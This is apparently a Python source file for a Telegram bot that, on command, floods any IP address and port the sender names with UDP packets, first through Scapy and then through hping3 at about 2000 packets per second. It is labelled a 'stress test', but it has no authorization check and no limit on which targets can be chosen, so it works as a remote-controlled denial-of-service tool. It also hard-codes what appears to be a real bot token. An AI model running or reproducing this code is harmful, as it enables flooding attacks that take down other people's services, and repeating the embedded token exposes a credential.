import asyncio
import os
import logging
from scapy.all import IP, UDP, Raw, send
from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
from subprocess import Popen, PIPE

# Telegram Bot Token
TG_BOT_TOKEN = "7908068015:AAFucAomrbNoMAU2XZy1HgeMwuf9D0VtKZo"

# Configure Logging
logging.basicConfig(
    filename="udp_stress_advanced.log",
    level=logging.INFO,
    format="%(asctime)s - %(levelname)s - %(message)s"
)

# Stop Flag
stop_test = False

# Function to send packets using Scapy
def send_scapy_packets(ip, port, packet_count):
    try:
        logging.info(f"Sending {packet_count} UDP packets to {ip}:{port}")
        payload = os.urandom(1024)  # 1KB random data payload
        for _ in range(packet_count):
            packet = IP(dst=ip) / UDP(dport=port) / Raw(load=payload)
            send(packet, verbose=False)
    except Exception as e:
        logging.error(f"Error during packet sending: {e}")
        raise

# Function to run hping3
def run_hping3(ip, port, packet_rate):
    logging.info(f"Starting hping3 stress test to {ip}:{port} at {packet_rate} packets/sec")
    command = [
        "hping3",
        "--udp",
        "-i", "u500",  # Send a packet every 500 microseconds (2000 packets/sec)
        "-d", "1024",  # 1KB payload size
        "-p", str(port),
        ip
    ]
    process = Popen(command, stdout=PIPE, stderr=PIPE)
    stdout, stderr = process.communicate()
    if process.returncode == 0:
        logging.info(f"hping3 Output: {stdout.decode('utf-8')}")
    else:
        logging.error(f"hping3 Error: {stderr.decode('utf-8')}")

# UDP Stress Test Function
async def udp_stress_test(ip, port, duration, packet_count, update: Update):
    global stop_test
    stop_test = False
    packets_sent = 0
    errors = 0

    packets_per_second = packet_count // duration

    await update.message.reply_text(
        f"UDP Stress Test Started on {ip}:{port} for {duration} seconds with {packets_per_second} packets/second."
    )

    try:
        for _ in range(duration):
            if stop_test:
                break

            send_scapy_packets(ip, port, packets_per_second)
            packets_sent += packets_per_second
            await asyncio.sleep(1)  # Wait 1 second between bursts

    except Exception as e:
        errors += 1
        logging.error(f"Error during Scapy packet sending: {e}")
        await update.message.reply_text(f"Error during Scapy test: {e}")

    await update.message.reply_text(
        f"Test Completed: Total Packets Sent: {packets_sent}, Errors: {errors}. Check logs for detailed report."
    )
    logging.info(f"Final Summary - Total Packets Sent: {packets_sent}, Errors: {errors}")

    # Run additional stress using hping3
    await update.message.reply_text("Running additional stress test with hping3.")
    run_hping3(ip, port, packet_rate=2000)

# Command to Start Stress Test
async def start_udp_test(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global stop_test
    stop_test = False  # Reset stop flag

    try:
        ip = context.args[0]
        port = int(context.args[1])
        duration = int(context.args[2])  # Total duration in seconds
        packet_count = int(context.args[3])  # Total number of packets

        # Validate total packets
        if packet_count > 10_000_000:
            await update.message.reply_text("Packet count too high. Please use less than 10 million packets.")
            return

        await update.message.reply_text(
            f"Starting UDP Stress Test on {ip}:{port} with {packet_count} packets over {duration} seconds."
        )
        await udp_stress_test(ip, port, duration, packet_count, update)

    except IndexError:
        await update.message.reply_text(
            "Usage: /start_udp_test <ip> <port> <duration_in_seconds> <packet_count>"
        )
    except ValueError:
        await update.message.reply_text("Invalid input. Ensure IP, port, and duration are correct.")
    except Exception as e:
        await update.message.reply_text(f"An unexpected error occurred: {e}")

# Command to Stop Stress Test
async def stop_udp_test(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global stop_test
    stop_test = True
    await update.message.reply_text("UDP Stress Test Stopped.")
    logging.info("UDP Stress Test Stopped by User.")

# Main Function
def main():
    app = ApplicationBuilder().token(TG_BOT_TOKEN).build()

    app.add_handler(CommandHandler("start_udp_test", start_udp_test))
    app.add_handler(CommandHandler("stop_udp_test", stop_udp_test))

    app.run_polling()

if __name__ == "__main__":
    main()
